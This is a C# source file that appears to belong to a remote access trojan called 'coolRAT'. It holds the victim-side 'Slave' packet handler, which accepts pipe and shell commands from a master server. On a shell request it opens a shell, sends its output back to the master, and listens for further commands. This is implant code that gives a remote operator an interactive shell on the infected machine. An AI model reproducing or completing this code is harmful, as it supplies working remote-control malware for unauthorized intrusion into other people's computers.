using coolRAT.Libs;
using coolRAT.Libs.PacketHandlers;
using coolRAT.Libs.PacketProcessors;
using coolRAT.Libs.Packets;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace coolRAT.Slave
{
    public class Slave_PacketHandler : PacketHandler
    {
        public Slave_PacketHandler(TcpConnection connection) : base(connection)
        {

        }

        public override void HandlePacket(object sender, string packet_raw)
        {
            Packet packet = Packet.Deserialize(packet_raw);
            if (packet.Type == "ConnectPipePacket")
            {
                ConnectPipePacket_PacketProcessor connectPipePacket_PacketProcessor
                    = new ConnectPipePacket_PacketProcessor(Connection, ConnectPipePacket.Deserialize(packet_raw), 
                    new Dictionary<Guid, Client> { { SlaveGlobalData.LocalClient.UniqueId, SlaveGlobalData.LocalClient } });

                connectPipePacket_PacketProcessor.Process();
                return;
            }
            if (packet.Type == "DisconnectPipePacket")
            {
                DisconnectPipePacket_PacketProcessor disconnectPipePacket_PacketProcessor
                    = new DisconnectPipePacket_PacketProcessor(Connection, DisconnectPipePacket.Deserialize(packet_raw),
                    new Dictionary<Guid, Client> { { SlaveGlobalData.LocalClient.UniqueId, SlaveGlobalData.LocalClient } });

                disconnectPipePacket_PacketProcessor.Process();
                return;
            }
            if(packet.Type == "ConnectShellPacket")
            {
                ConnectShellPacket_PacketProcessor connectShellPacket_PacketProcessor
                   = new ConnectShellPacket_PacketProcessor(Connection, ConnectShellPacket.Deserialize(packet_raw),
                   new Dictionary<Guid, Client> { { SlaveGlobalData.LocalClient.UniqueId, SlaveGlobalData.LocalClient } },
                   SlaveGlobalData.MasterServerInfo.RemoteServer);

                Shell shell = connectShellPacket_PacketProcessor.Process();
                if (shell == null) return; // fuckup

                SlaveGlobalData.ShellListenerLoop = new PacketListenerLoop(shell.Connection, new Shell_PacketHandler(shell.Connection, SlaveGlobalData.LocalClient, shell));
                SlaveGlobalData.ShellInstance = shell;

                SlaveGlobalData.ShellOutputChangedHandler = (s, e) =>
                {
                    Shell_IO_ChangedPacket shell_IO_Changed = new Shell_IO_ChangedPacket(ChangeType.Output, e.Change);
                    shell.Connection.SendPacket(shell_IO_Changed);
                };

                shell.ShellOutputChanged += SlaveGlobalData.ShellOutputChangedHandler;

                Task.Run(() => SlaveGlobalData.ShellListenerLoop.Run());
            }
        }
    }
}
